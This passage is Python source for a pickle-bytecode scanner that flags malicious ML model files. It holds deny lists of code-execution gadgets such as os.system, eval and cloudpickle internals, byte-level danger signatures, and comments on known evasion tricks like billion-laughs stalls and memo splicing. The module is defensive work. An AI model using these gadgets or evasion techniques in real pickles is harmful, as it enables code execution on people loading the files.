"""Pickle bytecode analysis engine.

Extracted verbatim from ``hayward.scanner`` (HW-147): the deny/allow global
classifier, the operand-stack pickle VM, the proto-0/1 resync logic, embedded
and nested-pickle detection, and the unknown-call triage. Pure analysis over
model bytes -- it never imports, unpickles or executes anything it reads.

The two operand/memo budget caps that the test suite tunes
(``_PICKLE_STACK_MAX_DEPTH``, ``_PICKLE_MEMO_MAX_ENTRIES``) stay defined on
``hayward.scanner``; the VM reads them from there by attribute so that
``monkeypatch.setattr(scanner_module, ...)`` keeps steering the walk.
"""

from __future__ import annotations

import ast
import contextlib
import dataclasses
import io
import pickletools
import re
import reprlib
from dataclasses import dataclass
from typing import Any

import hayward.scanner as _scanner
from hayward.findings import Severity

PICKLE_DENIED_GLOBALS: frozenset[str] = frozenset({
    "os.system", "posix.system", "nt.system",
    "os.popen", "os.popen2", "os.popen3", "os.popen4",
    "os.execl", "os.execle", "os.execlp", "os.execlpe",
    "os.execv", "os.execve", "os.execvp", "os.execvpe",
    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
    "os.fork", "os.forkpty", "os.kill", "os.remove", "os.unlink", "os.rmdir",
    "posix.execv", "posix.execve", "posix.fork", "posix.kill",
    "posix.spawnv", "posix.spawnve",
    "nt.spawnv", "nt.spawnve",
    "subprocess.run", "subprocess.call", "subprocess.check_call",
    "subprocess.check_output", "subprocess.Popen",
    "builtins.eval", "builtins.exec", "builtins.compile",
    "builtins.__import__",
    "__builtin__.eval", "__builtin__.exec", "__builtin__.compile",
    "__builtin__.__import__",
    "runpy._run_code", "runpy.run_path", "runpy.run_module",
    "pty.spawn",
    "shutil.rmtree",
    "ctypes.CDLL", "ctypes.PyDLL", "ctypes.WinDLL",
    # ── Published gadgets carried by picklescan's _unsafe_globals ──
    #
    # Harvested from picklescan (MIT), whose list is in turn harvested from a
    # decade of published research (Slaviero BlackHat 2011, ColdwaterQ DEFCON
    # 2022, Trail of Bits' fickling, Rehberger's backdooring series). These
    # are *known, documented* gadgets, and every one of them previously landed
    # in the unknown bucket and was suppressed at INFO whenever it was
    # referenced without an attack-shaped literal argument.
    #
    # That gap is worth stating plainly because it cuts against the argument
    # for the argument-evidence tier below: evidence-based triage answers the
    # gadget nobody has published yet, and it does nothing for the gadget
    # everyone has published and we simply never listed. The two are
    # complementary. A cloudpickle payload is the clearest case -- its
    # argument is marshalled bytecode, not a command string, so no argument
    # heuristic will ever fire on it and only the name identifies it.
    #
    # Deliberately NOT adopted from picklescan: `functools.partial`,
    # `builtins.getattr` and the `operator.attrgetter/itemgetter/methodcaller`
    # family. All three are genuinely common in legitimate pickles, and the
    # re-triage below already reports the dynamic-resolution chains they
    # enable at MEDIUM with the reason attached -- more precise than a flat
    # CRITICAL. picklescan's whole-module wildcards were also left alone: its
    # `uuid: *` entry reports an ordinary pickled `uuid.UUID` as a dangerous
    # import, which is the precision cost of that mechanism.
    "builtins.apply", "builtins.breakpoint", "builtins.open",
    "__builtin__.apply", "__builtin__.breakpoint", "__builtin__.open",
    "types.CodeType",
    "_io.FileIO",
    "logging.FileHandler",
    "pkgutil.resolve_name",
    "ensurepip._run_pip",
    "doctest.debug_script",
    "imaplib.IMAP4_stream",
    "code.InteractiveInterpreter.runcode",
    "trace.Trace.run", "trace.Trace.runctx",
    # cloudpickle reconstructs live functions from marshalled code objects --
    # arbitrary code execution by construction, and no model's weights need it.
    #
    # `_builtin_type` is the exception and is deliberately absent: it maps a
    # name to a type object ("CodeType" -> types.CodeType) and executes
    # nothing on its own. It appeared in 56 files of SafePickle's benign half,
    # 140 of whose 144 flagged files relied on cloudpickle or torch internals
    # with no sink anywhere in the stream. The companions below are what turn
    # a code object into a callable, and they stay.
    "cloudpickle.cloudpickle._function_setstate",
    "cloudpickle.cloudpickle._make_cell",
    "cloudpickle.cloudpickle._make_empty_cell",
    "cloudpickle.cloudpickle._make_function",
    "cloudpickle.cloudpickle.subimport",
    # torch's own internals reachable from a checkpoint.
    #
    # `torch.storage._load_from_bytes` is deliberately absent. It is
    # `torch.load(io.BytesIO(b), weights_only=False)`: a nested unrestricted
    # load whose whole payload lives in the bytes literal `b`. It was denied
    # outright because that inner stream was invisible to this walker, which
    # made the deny the only way to see it at all.
    #
    # That justification expired when MFV-PICKLE-008 started walking bytes
    # literals. The inner stream is now read directly, so the call is judged
    # by what it actually carries rather than by its name. The old comment
    # also claimed torch.save() never emits it, so real checkpoints were
    # unaffected: SafePickle's benign half contains 115 files that do, because
    # plain-pickling a tensor emits it too. Denying it unconditionally cost
    # 115 false positives to catch payloads the nested walk now sees.
    "torch.serialization.load",
    "torch.utils.collect_env.run",
    "torch._inductor.codecache.compile_file",
    "torch.jit.unsupported_tensor_ops.execWrapper",
    "torch._dynamo.guards.GuardBuilder.get",
    "torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression",
    "torch.utils._config_module.ConfigModule.load_config",
    "torch.utils.bottleneck.__main__.run_autograd_prof",
    "torch.utils.bottleneck.__main__.run_cprofile",
    "torch.utils.data.datapipes.utils.decoder.basichandlers",
    "lib2to3.pgen2.grammar.Grammar.loads",
    "lib2to3.pgen2.pgen.ParserGenerator.make_label",
    "idlelib.autocomplete.AutoComplete.fetch_completions",
    "idlelib.autocomplete.AutoComplete.get_entity",
    "idlelib.calltip.Calltip.fetch_tip",
    "idlelib.calltip.get_entity",
    "idlelib.debugobj.ObjectTreeItem.SetText",
    "idlelib.pyshell.ModifiedInterpreter.runcode",
    "idlelib.pyshell.ModifiedInterpreter.runcommand",
    "idlelib.run.Executive.runcode",
})

# Fully-qualified globals routinely emitted by legitimate serialization of
# built-in containers and common ML tensor/array formats. Referencing these
# alone is not evidence of tampering.
PICKLE_ALLOWED_GLOBALS: frozenset[str] = frozenset({
    "collections.OrderedDict", "collections.defaultdict",
    "collections.Counter", "collections.deque",
    "builtins.set", "builtins.frozenset", "builtins.dict", "builtins.list",
    "builtins.tuple", "builtins.bytearray", "builtins.complex",
    # slice() builds a data object and cannot execute anything. It appears in
    # ordinary sklearn and pandas pickles, and only became visible here once
    # the walk learned to resync past raw array bytes.
    "builtins.slice",
    "__builtin__.set", "__builtin__.frozenset",
    "copyreg._reconstructor", "copyreg.__newobj__", "copyreg.__newobj_ex__",
    "_codecs.encode",
    "numpy.core.multiarray._reconstruct", "numpy.core.multiarray.scalar",
    "numpy._core.multiarray._reconstruct", "numpy._core.multiarray.scalar",
    "numpy.ndarray", "numpy.dtype",
    "torch._utils._rebuild_tensor", "torch._utils._rebuild_tensor_v2",
    "torch._utils._rebuild_parameter", "torch._utils._rebuild_sparse_tensor",
    "torch._utils._rebuild_meta_tensor_no_storage",
    "torch.Size",
    "torch.serialization._get_layout",
})

# Modules whose dtype-specific storage/tensor classes are treated as allowed
# by name shape rather than exact match (they number in the dozens --
# FloatStorage, BFloat16Storage, HalfTensor, ... -- and change across torch
# versions, so an exhaustive list would be a maintenance trap).
#
# The parent module is matched *exactly*, not by prefix. The prefix form this
# replaces (`ref.startswith("torch.") and ref.endswith("Storage")`) was a
# wildcard over an attacker-controlled string: it allowlisted any name at any
# depth of the torch namespace, so `torch.utils.collect_env.SomeTensor` or
# `torch.<anything>.<anything>Storage` was waved through without ever being
# classified. No weaponizable callable matching it was found in torch, but the
# rule trusted far more of the namespace than the real class names occupy --
# and the whole point of the unknown bucket is that we can't enumerate what
# lives out there.
_PICKLE_ALLOWED_STORAGE_PARENTS: frozenset[str] = frozenset({
    "torch", "torch.cuda", "torch.storage",
})
# Leading `_` covers the private aliases torch has shipped (`_TypedStorage`);
# the CapWords body is what keeps a lowercase function name from matching.
_PICKLE_STORAGE_NAME_RE = re.compile(r"^_?[A-Z][A-Za-z0-9]*(?:Storage|Tensor)$")

# ML frameworks whose namespaces carry no code-execution primitives, paired
# with a class-shaped leaf (leading capital). The package prefix does the
# safety work (no exec machinery lives in sklearn.*, scipy.*, transformers.*)
# and the capital letter does the shape work: estimators, layers, dtypes and
# config dataclasses are constructed at load, while the genuinely dangerous
# members of these packages are all lowercase *functions* (dynamic-module
# loading in transformers, file I/O in sklearn.datasets), which stay in the
# unknown bucket where the argument-evidence triage sees them.
# `torch` is deliberately NOT here: torch.utils.collect_env and friends are
# dangerous submodules, and a CapWords leaf under one
# (torch.utils.collect_env.SomethingTensor) must stay unknown. torch is
# covered by the storage-parents rule and exact entries instead.
# Evidence: every unknown global across the quickset benign corpus is
# numpy/sklearn/scipy/joblib/torch/transformers machinery of exactly this
# shape (measured 2026-08-04: 62 names, all class-shaped bar the exact
# additions below).
_PICKLE_ALLOWED_ML_CLASS_ROOTS: frozenset[str] = frozenset({
    "sklearn", "scipy", "transformers",
})
_PICKLE_ML_CLASS_NAME_RE = re.compile(r"^_?[A-Z][A-Za-z0-9]*$")

# Measured ordinary-ML machinery with lowercase leaves, so the class-shape
# rule cannot cover it. Each is a type/constructor with no execution
# surface, observed in the benign corpus.
_PICKLE_ALLOWED_ML_EXACT: frozenset[str] = frozenset({
    "numpy.float64", "numpy.random.mtrand.RandomState",
    "torch.device", "argparse.Namespace",
    "joblib.numpy_pickle.NumpyArrayWrapper", "scipy.sparse._csr.csr_matrix",
})


def _is_ml_constructor_allowed(ref: str) -> bool:
    """True for refs allowlisted as ordinary ML constructors (class-shaped
    leaves in the ML roots, or the exact lowercase-leaf additions). Used by
    the classifier, and by the MFV-PICKLE-006 loop to skip them: config
    objects take string arguments constantly (step names, output_dir, device
    names), so the anomalous-string premise is false for the whole class."""
    if ref in _PICKLE_ALLOWED_ML_EXACT:
        return True
    module, _, name = ref.rpartition(".")
    root = module.partition(".")[0]
    return root in _PICKLE_ALLOWED_ML_CLASS_ROOTS and bool(
        _PICKLE_ML_CLASS_NAME_RE.match(name))

# NOTE on a tier that was tried and deliberately left out: "the root module is
# stdlib (per sys.stdlib_module_names) or bundled packaging tooling, therefore
# suspicious". The reasoning was appealing -- gadget hunters source from
# modules guaranteed present in the victim process, which is where `pip.main`,
# `linecache`, `ssl` and `operator.attrgetter` all come from, and it needs no
# hand-written list of bad names. Measured against ordinary pickles it does not
# survive: `datetime.datetime`, `decimal.Decimal`, `uuid.UUID`,
# `fractions.Fraction`, `re._compile`, `array._array_reconstructor` and
# `functools.partial` are all unrecognized stdlib globals that legitimate
# pickles construct constantly, so the tier fired on nearly every real file
# while catching nothing the argument-level signals below did not already
# catch. The stdlib is where the gadgets live *and* where the ordinary data
# types live, and nothing observable in the opcode stream separates the two.

# Bytes that commonly appear in malicious pickle payloads. Used ONLY as a
# fallback when the opcode stream can't be parsed at all (corrupted/malformed
# pickle) -- unlike opcode-based classification, a raw substring can't tell a
# real dangerous call from an unrelated string, so it's kept out of the
# primary (parseable) path entirely, which is where it used to cause false
# positives on any *well-formed* pickle whose object happened to define
# `__reduce__`/`__setstate__` (true of most custom classes). In the
# unparseable-stream fallback specifically, that risk doesn't apply the same
# way -- a stream we can't even walk as valid opcodes is already anomalous.
PICKLE_DANGER_SIGNATURES: list[bytes] = [
    b"os.system", b"subprocess", b"exec(", b"eval(",
    b"__import__", b"posix\nsystem", b"nt\nsystem",
    b"__reduce__", b"__setstate__", b"__getstate__",
]

# Opcodes that push a string constant onto the pickle VM stack -- the subset
# of the pickle protocol _resolve_pickle_globals needs to track in order to
# resolve STACK_GLOBAL's two preceding string pushes into `module.name`.
_STRING_PUSH_OPCODES = frozenset({
    "SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE",
    "SHORT_BINSTRING", "BINSTRING", "STRING",
})
# Opcodes that push a literal int/float/bytes constant -- needed (alongside
# the string pushes above) to resolve REDUCE/NEWOBJ/NEWOBJ_EX call arguments
# to concrete values instead of just the callable's name.
_INT_PUSH_OPCODES = frozenset({"BININT", "BININT1", "BININT2", "LONG1", "LONG4", "INT", "LONG"})
_FLOAT_PUSH_OPCODES = frozenset({"FLOAT", "BINFLOAT"})
_BYTES_PUSH_OPCODES = frozenset({"SHORT_BINBYTES", "BINBYTES", "BINBYTES8", "BYTEARRAY8"})
_MEMO_STORE_OPCODES = frozenset({"PUT", "BINPUT", "LONG_BINPUT"})
_MEMO_FETCH_OPCODES = frozenset({"GET", "BINGET", "LONG_BINGET"})
# Opcodes that push exactly one value whose identity this walk cannot resolve.
# They must still push *something* -- see the handler in _walk_one_pickle for
# why omitting the push is an exploitable stack desync rather than a cosmetic
# gap.
_OPAQUE_PUSH_OPCODES = frozenset({
    "PERSID", "EXT1", "EXT2", "EXT4", "NEXT_BUFFER",
})

# ── Out-of-band memo indices ──────────────────────────────────────────
#
# Every Python pickler assigns memo indices densely and consecutively:
# CPython's `Pickler.memoize` does `idx = len(self.memo)`, and
# dill/cloudpickle/joblib inherit that because they subclass it. So the
# indices one pickle writes always form a *single contiguous run* with no
# holes in it.
#
# A large hole means the writer chose indices unrelated to the memo it was
# actually filling. That is what pickle-splicing tools do so a spliced-in
# memo write cannot clobber the host model's: ShadowPickle
# (arXiv:2607.17503) rewrites every `BINPUT i` in its payload to
# `LONG_BINPUT i + <constant>` for exactly this reason. The check below is on
# the *hole*, never on a particular constant, so a splicer choosing a
# different offset trips it identically.
#
# The measurement that matters is the ratio of the run's span
# (`max - min + 1`) to the number of slots actually written, not the absolute
# index. Absolute index is the wrong thing to threshold, because a `Pickler`
# reused across many `dump()` calls carries its memo forward: shared across
# 2000 five-slot dumps, a later sub-stream writes indices 4092-4102 while
# owning only 11 slots. That is a legitimate stream with a large absolute
# index and no hole, and an absolute-index rule reports it. Its span-to-slots
# ratio is 1.0, the same as every other well-formed stream.
#
# Measured across 12 real pickle-bearing model files (7 in
# benchmark/ground_truth/clean_models plus 8 in picklebench's model-cache,
# covering torch zip, torch legacy, raw and zlib joblib, and sklearn with
# custom classes) and 60 synthetic `pickle.dumps` streams (protocols 0-5
# across recursive structures, shared references, custom
# `__reduce__`/`__getstate__` classes, 20k-key dicts, bytes and set-heavy
# containers): the ratio was exactly 1.0 in every single case, with no
# exceptions. The largest legitimate span seen was 907 slots
# (tiny-random-t5's state_dict), and the largest legitimate absolute index
# 906.
#
# FACTOR is how many times its own slot count a stream's span has to reach
# before the hole counts as evidence: 64x headroom over an observed ratio
# that never left 1.0. FLOOR keeps the ratio from firing on tiny streams,
# where a handful of slots makes it noisy; at 4096 it is 4.5x the largest
# absolute index any real model here produced, and it only binds below 64
# slots (above that, slots * FACTOR is larger).
_MEMO_INDEX_BAND_FACTOR = 64
_MEMO_INDEX_BAND_FLOOR = 4096

# Cap on distinct memo indices tracked per pickle. Indices are recorded even
# when the simulated stack is empty (an index written by a spliced block is
# evidence about the writer regardless), and that is the one path that used to
# cost nothing at all -- 500MB of bare `LONG_BINPUT` opcodes is 100M distinct
# indices and several GB of set. Past this bound the pickle stops being
# profiled: a stream with a million memo slots is not the shape this check
# looks for anyway, since its own slot count would put the threshold above any
# hole in it. Set 1000x above the largest real model measured here (907 slots).
_MEMO_INDEX_MAX_TRACKED = 1_000_000




class _PickleWalkBudgetExceeded(Exception):
    """The simulated stack outgrew _PICKLE_STACK_MAX_DEPTH. Raised rather
    than swallowed so the caller keeps what was already resolved and reports
    the unread remainder, instead of either OOM-ing or claiming a complete
    analysis."""


@dataclass(frozen=True)
class PickleMemoProfile:
    """How one pickle stream used the unpickler's memo.

    `slots` counts distinct memo indices written to, `max_index` is the
    highest (-1 when nothing was memoized), and `out_of_band` holds the
    indices sitting past a disproportionate hole in the run. `out_of_band` is
    empty for every well-formed stream.

    `walk_budget_exceeded` is carried here -- rather than adding a fourth
    return value callers would have to unpack -- because this dataclass is
    already the walk's per-file metadata channel: it is True when the walk
    terminated early on _PICKLE_STACK_MAX_DEPTH and some of the stream was
    never read.
    """
    slots: int
    max_index: int
    out_of_band: tuple[int, ...]
    walk_budget_exceeded: bool = False


def _profile_memo_indices(indices: set[int]) -> PickleMemoProfile:
    """Summarize the memo indices one pickle stored into, flagging a hole in
    the run that is disproportionate to the memo actually in use.

    The threshold is derived from the observed slot count rather than fixed,
    so it scales with the host model: an 814-slot BERT state_dict and a
    5-slot toy pickle are both judged against a bounded multiple of their own
    memo size. Takes the distinct indices as a set so a stream that writes the
    same slot a million times costs no more to profile than the memo dict
    already being simulated alongside it.
    """
    if not indices:
        return PickleMemoProfile(0, -1, ())
    ordered = sorted(indices)
    span = ordered[-1] - ordered[0] + 1
    if span < max(_MEMO_INDEX_BAND_FLOOR, len(ordered) * _MEMO_INDEX_BAND_FACTOR):
        return PickleMemoProfile(len(ordered), ordered[-1], ())
    # There is a hole big enough to be evidence. Split the run at its widest
    # gap and report everything above it: that is the spliced block's band,
    # with the host model's own band left below.
    widest = max(range(len(ordered) - 1), key=lambda i: ordered[i + 1] - ordered[i])
    return PickleMemoProfile(len(ordered), ordered[-1], tuple(ordered[widest + 1:]))


class _PickleMarkType:
    """Sentinel for the pickle VM's MARK opcode on the simulated stack.

    The real ``Unpickler`` keeps a separate "metastack" so MARK effectively
    starts a fresh sub-stack; here a single flat list is used instead with
    this sentinel marking where the mark was pushed, popped by
    ``_pop_to_mark`` -- behaviorally equivalent, simpler to reason about
    alongside the rest of this walk.
    """
    __slots__ = ()

    def __repr__(self) -> str:
        return "<PICKLE-MARK>"


class _PickleOpaqueType:
    """Sentinel for a simulated stack value this walker can't resolve: the
    result of a REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call (a real unpickle would
    push whatever object that callable returned, which is unknowable
    statically), a PERSID/EXT-registry lookup, or anything else outside the
    literal-constant/container opcodes this walk understands. Keeping a
    placeholder (rather than skipping the push) is what keeps the stack
    depth simulation correct for later opcodes; being non-literal is what
    correctly poisons any enclosing args tuple that embeds it, per the
    "don't guess at values" requirement -- e.g. `Foo(SomeReduceResult())` is
    reported as callable-only, not as a fabricated literal.
    """
    __slots__ = ()

    def __repr__(self) -> str:
        return "<PICKLE-OPAQUE>"


class _PickleCallResultType:
    """Sentinel for the return value of a REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ
    call whose callable this walk *did* resolve to a `module.name`.

    A narrower `_PICKLE_OPAQUE`: the value is equally unknowable, but its
    *provenance* is not. Distinguishing "this argument is the object another
    resolved call just built" from "this argument is a persistent-ID or
    extension-registry lookup" is what makes call chaining observable, and the
    two must stay distinguishable because real model pickles are full of the
    latter -- every torch tensor is rebuilt from a PERSID storage -- and
    contain none of the former.

    Deliberately not a literal (`_is_pickle_literal` rejects it, as it rejects
    `_PICKLE_OPAQUE`), so it still poisons an enclosing argument tuple rather
    than being reported as a resolved value.
    """
    __slots__ = ("ref",)

    def __init__(self, ref: str) -> None:
        self.ref = ref

    def __repr__(self) -> str:
        return f"<PICKLE-RESULT-OF {self.ref}>"


_PICKLE_MARK = _PickleMarkType()
_PICKLE_OPAQUE = _PickleOpaqueType()


class _PickleGlobalRef(str):
    """A resolved GLOBAL/STACK_GLOBAL reference pushed on the simulated
    stack. It *renders* as a string ('numpy.ndarray'), which is exactly the
    problem: arg-text extraction was reading these as free-text arguments,
    and any allowlisted callable handed a class reference (defaultdict(int),
    _reconstruct(numpy.ndarray, ...), both constant in real models) then
    tripped the "invoked with a string argument" check. A global reference
    is an object, not text; this marker keeps the two apart without changing
    how the ref resolves, prints, or compares."""
    __slots__ = ()


def _pop_to_mark(stack: list) -> list:
    """Pop and return every value pushed since the most recent MARK, in
    original push order, consuming the MARK itself.

    Tolerates a missing MARK (truncated/malformed stream) by draining the
    whole stack rather than raising -- this walks attacker-controlled bytes,
    so a deliberately corrupted opcode sequence must degrade to "resolved
    nothing further," never crash the scan.
    """
    items: list = []
    while stack:
        value = stack.pop()
        if value is _PICKLE_MARK:
            break
        items.append(value)
    items.reverse()
    return items


def _is_pickle_literal(value: Any, _seen: set[int] | None = None) -> bool:
    """True if value is built entirely from pickle-VM literal constants
    (str, bytes, int, float, bool, None, or a tuple/list composed entirely of
    literals) -- the set of values this module is willing to print verbatim
    as resolved call-argument evidence. Returns False for `_PICKLE_OPAQUE`
    and any other unresolved/opaque stack value, which is what keeps a
    dynamic or chained-call argument (e.g. built from another REDUCE's
    return value) from being misreported as a concrete literal.

    Shared containers are visited once. The simulated stack is a DAG, not a
    tree: the `DUP` opcode pushes a second reference to the same object, so
    `DUP TUPLE2` doubles the node count a naive traversal would walk while
    costing two bytes and adding one level of depth. Repeating it is the
    pickle spelling of a billion-laughs attack -- ColdwaterQ ships exactly
    this as `billionLaughs.pt` -- and it took this function from
    milliseconds to 6.9 seconds on a **73-byte** file, doubling per extra
    round. For a scanner that is an evasion rather than a slowdown: the scan
    stalls or gets killed, and the file is never reported.

    An identity set is the right bound rather than a node budget, because the
    only way to present a genuinely large *tree* is to spend proportionally
    many bytes on it, which `MAX_SCAN_BYTES` already caps. Note this is
    memoized on identity, not equality -- two equal-but-distinct tuples are
    still each checked.
    """
    if value is None or isinstance(value, (bool, int, float, str, bytes, bytearray)):
        return True
    if isinstance(value, (tuple, list)):
        if _seen is None:
            _seen = set()
        marker = id(value)
        if marker in _seen:
            # Already validated (or currently being validated, i.e. a cycle):
            # a container that only contains containers cannot make the whole
            # value non-literal on its own.
            return True
        _seen.add(marker)
        return all(_is_pickle_literal(v, _seen) for v in value)
    return False


# Bounded renderer for resolved call arguments. Plain `repr()` walks a shared
# structure once per path, so the `DUP`-built DAG described in
# `_is_pickle_literal` renders as a 218MB string from a 73-byte file (4.7s,
# doubling per extra round) -- which then gets embedded in a finding message,
# serialized into JSON/SARIF and printed. Memoizing the *analysis* walks was
# not enough on its own; the display path needed its own bound.
#
# Only presentation is capped. Detection still reads the real values, so a
# truncated render never changes a verdict.
_PICKLE_ARG_REPR = reprlib.Repr()
_PICKLE_ARG_REPR.maxlevel = 6
_PICKLE_ARG_REPR.maxtuple = 8
_PICKLE_ARG_REPR.maxlist = 8
_PICKLE_ARG_REPR.maxset = 8
_PICKLE_ARG_REPR.maxfrozenset = 8
_PICKLE_ARG_REPR.maxdict = 8
_PICKLE_ARG_REPR.maxstring = 256
_PICKLE_ARG_REPR.maxother = 256
_PICKLE_ARG_REPR.maxlong = 64

# Cap on literal texts kept from a partially-resolved call. A handful is
# plenty of evidence; the bound exists because argument lists are
# attacker-sized.
_PICKLE_MAX_PARTIAL_TEXTS = 8


@dataclass(frozen=True)
class PickleResolvedCall:
    """A REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose callable resolved
    to a known `module.name` global AND whose argument(s) resolved entirely
    to literal constants already on the simulated stack -- e.g. the concrete
    `('curl ... | sh',)` actually passed to `os.system`, not merely the fact
    that `os.system` is referenced somewhere in the stream. This is the
    fickling-style argument-level evidence layered on top of the existing
    global-reference walk.
    """
    ref: str
    args: tuple[Any, ...]
    kwargs: dict[str, Any] | None = None
    # Literal text arguments recovered from a call whose argument list did
    # *not* fully resolve, because at least one sibling argument was opaque.
    #
    # Requiring every argument to be literal before recording anything is the
    # right rule for `args` -- it is what keeps a fabricated value out of a
    # finding -- but applied to the whole call site it threw away real
    # evidence. The canonical dynamic-resolution chain is
    # `getattr(globals(), "eval")`: `globals()` is a REDUCE result and so
    # opaque, which discarded the `"eval"` literal that is the entire point of
    # the chain. Slaviero documented that shape in 2011 and it landed at INFO
    # here (tracked as DEF-45).
    #
    # These are strings that genuinely appeared in an argument position, never
    # a guess at an unresolved value, and `format()` renders them with
    # ellipses so a partially-resolved call can never be misread as a complete
    # one. Non-empty only when the call did not fully resolve, so it doubles
    # as the "is this partial" flag.
    partial_texts: tuple[str, ...] = ()
    # Refs of the resolved calls whose *return values* were passed into this
    # one, i.e. the edges of the call graph the pickle builds. Empty for the
    # overwhelmingly common shape where every argument is a literal, a
    # persistent-ID storage or an extension-registry lookup.
    chained_from: tuple[str, ...] = ()
    # True if this call's own return value was later used as the *callable*
    # operand of another call opcode -- the pickle invoked something it had
    # just computed. See `_triage_unknown_pickle_call` for why that is the
    # load-bearing half of the chain signal.
    result_invoked: bool = False

    def format(self) -> str:
        """Render as a call-expression string, e.g. os.system('echo pwned').

        Uses the bounded renderer above rather than plain `repr()`: these are
        attacker-controlled structures, and an unbounded render is a memory
        bomb (see `_PICKLE_ARG_REPR`).
        """
        if self.partial_texts:
            shown = ", ".join(_PICKLE_ARG_REPR.repr(t) for t in self.partial_texts)
            return f"{self.ref}(... {shown} ...)"
        parts = [_PICKLE_ARG_REPR.repr(a) for a in self.args]
        if self.kwargs:
            parts.extend(f"{k}={_PICKLE_ARG_REPR.repr(v)}" for k, v in self.kwargs.items())
        return f"{self.ref}({', '.join(parts)})"


# A protocol-2-or-later pickle opens with PROTO and its version byte. That
# two-byte marker is what a resync looks for: it is specific enough not to
# match often in tensor data, and every payload worth finding after a raw
# array uses one.
_PICKLE_RESYNC_MARKERS: tuple[bytes, ...] = tuple(
    b"\x80" + bytes([proto]) for proto in range(2, 6)
)

# Bounded so a file of near-misses cannot turn the walk quadratic. Real
# joblib files interleave a handful of arrays, not hundreds.
_MAX_PICKLE_RESYNCS = 16

# Protocol 0/1 pickles carry no PROTO opcode, so the marker scan above cannot
# see them. A proto-0/1 payload therefore opens on a GLOBAL opcode: the ASCII
# byte 'c' followed by a module line and a name line, each newline-terminated
# (e.g. b"cos\nsystem\n"). This regex matches that opener. It is used ONLY by
# the resync path below, never by the truncation verdict, because a legitimate
# proto-0 file also opens this way and must not be called "truncated".
_PICKLE_PROTO0_GLOBAL_RE = re.compile(
    rb"c[A-Za-z_][A-Za-z0-9_.]*\n[A-Za-z_][A-Za-z0-9_.]*\n"
)


def _next_pickle_offset(data: bytes, at: int) -> int | None:
    """Where the next pickle plausibly starts, at or after `at`.

    Searches for two openers and returns the earliest hit: the proto-2-5 PROTO
    markers (`_PICKLE_RESYNC_MARKERS`), and, as a heuristic for the resync path
    only, a proto-0/1 GLOBAL opener (`_PICKLE_PROTO0_GLOBAL_RE`, matching the
    'c<module>\\n<name>\\n' shape those older protocols use in place of PROTO).
    Adding the proto-0/1 candidate here is false-positive-safe: this only picks
    where the opcode walk RESUMES, and the walk reports something only if it
    actually resolves a denied or convicted global, so a spurious 'c...\\n...\\n'
    landing inside raw array bytes simply resolves nothing.
    """
    best: int | None = None
    for marker in _PICKLE_RESYNC_MARKERS:
        found = data.find(marker, at)
        if found != -1 and (best is None or found < best):
            best = found
    # Proto-0/1 GLOBAL opener, resync path only. Treat its match-start as a
    # candidate resume offset and fold it into the earliest-wins comparison.
    proto0 = _PICKLE_PROTO0_GLOBAL_RE.search(data, at)
    if proto0 is not None and (best is None or proto0.start() < best):
        best = proto0.start()
    return best


def _pickle_stream_truncated(data: bytes) -> bool:
    """True when `data` runs out in the middle of a pickle stream.

    A pickle ends at its STOP opcode. Bytes that stop arriving before that one
    is read are not a stream that was examined and found clean, they are a
    stream nobody finished reading, and whatever sat past the cut was never
    seen. That is the "Art of Hide and Seek" shape (arXiv 2508.19774) reached
    without any craft at all: a partial download or a corrupt checkpoint puts
    the payload past the end. It is also what makes scanning a remote
    checkpoint through HTTP range requests safe, since a prefix can only be
    trusted once every pickle in it has terminated.

    Judged only on segments opening with a PROTO opcode, and only when the
    parse consumed every remaining byte. Both conditions keep this quiet on
    files that are whole:

    - torch's legacy layout follows its four pickles with raw tensor storage.
      Storage does not open with PROTO, so the walk ends at the boundary
      instead of calling the tensors a truncated stream.
    - joblib splices raw array bytes *into* its stream, so the parse dies with
      bytes still to spare. That is unparseable content rather than a short
      file, and it stays silent for the reasons `_scan_pickle` documents.
    """
    # One buffer, seeked between pickles, rather than a fresh slice each time:
    # this walks attacker-sized files, and re-slicing the remainder per pickle
    # turns a file of many small streams quadratic.
    stream = io.BytesIO(data)
    total = len(data)
    pos = 0
    while pos < total:
        if data[pos:pos + 2] not in _PICKLE_RESYNC_MARKERS:
            return False
        stream.seek(pos)
        end_of_pickle: int | None = None
        # The exception is the signal here, not a failure to report: where the
        # walk gave up is exactly what separates a short file from an
        # unreadable one, and `stream` still holds that position.
        with contextlib.suppress(Exception):
            for op, _arg, offset in pickletools.genops(stream):
                if op.name == "STOP" and offset is not None:
                    end_of_pickle = offset + 1
                    break
        if end_of_pickle is None:
            # No STOP. Truncated only if the parse ran off the end of the
            # data; stopping short of it means an opcode it could not read,
            # which is a different (and deliberately unreported) condition.
            return stream.tell() >= total
        pos = end_of_pickle
    return False


def _resolve_pickle_globals(
    data: bytes,
) -> tuple[list[str], list[PickleResolvedCall], PickleMemoProfile]:
    """Resolve globals and calls across *every* pickle in `data`, not just the
    first one.

    A pickle stream ends at its STOP opcode, but several real model-file
    formats concatenate multiple pickles in one file. torch's legacy (non-zip)
    save format is the important one: it writes a magic number, a protocol
    version, a sys_info dict and only *then* the actual state_dict, as four
    separate pickles, followed by raw storage bytes. Walking only as far as
    the first STOP therefore examined a 14-byte magic-number pickle and
    declared the file clean -- `os.system('...')` sitting in pickle #4 of a
    2.5MB checkpoint produced zero findings, defeating the deny list, the
    unknown-bucket re-triage and every other check in this module at once.

    So: walk pickle after pickle until the stream is exhausted or stops
    parsing. Trailing non-pickle data (the legacy format's raw tensor
    storage) makes `genops` raise, which ends the walk normally and keeps
    everything resolved so far. A failure on the *first* pickle still
    propagates, preserving the "unparseable stream" fallback in `_scan_pickle`
    that callers depend on.

    Each pickle gets a fresh stack/memo, matching how a real ``Unpickler``
    treats consecutive `load()` calls; `globals_found` and `resolved_calls`
    accumulate across all of them.

    The returned `PickleMemoProfile` is deliberately **not** accumulated. Memo
    indices are judged one pickle at a time, because a real ``Unpickler``
    starts every `load()` with an empty memo, so "one unbroken run" is a
    property of a single pickle and says nothing about a concatenation of
    them. Unioning the index sets would also raise the denominator every check
    is measured against: a torch legacy file's 14-byte magic-number pickle
    would be judged against the ~800 slots of the state_dict three pickles
    later, so a splice into the small pickle would get roughly 800x the
